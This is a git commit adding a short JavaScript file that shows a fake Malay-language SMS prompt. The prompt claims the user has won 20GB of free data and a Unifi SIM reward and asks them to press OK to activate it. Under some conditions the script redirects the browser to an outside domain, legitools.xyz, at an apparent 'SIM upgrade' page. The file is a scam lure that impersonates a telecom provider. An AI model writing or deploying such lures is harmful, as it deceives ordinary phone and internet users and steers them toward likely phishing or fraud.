35ba44d6045f6019dc7440caf9f197e1704ce421
katemj25 <mbokofficial1@gmail.com>
2025-05-03 17:25:10 -0700

    Create activate-unifimobile-offer.js

---
+++ activate-unifimobile-offer.js
@@ -0,0 +1,5 @@
+var password = '20GB Data Percuma'
+password=prompt('SMS: Tahniah Nombor Anda Layak menerima Data Percuma 20GB , GANJARAN KAD SIM UNIFI, Sila Tekan OK untuk AKTIFKAN. ','20GB Data Percuma');
+if (password != '20GB Data Percuma') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
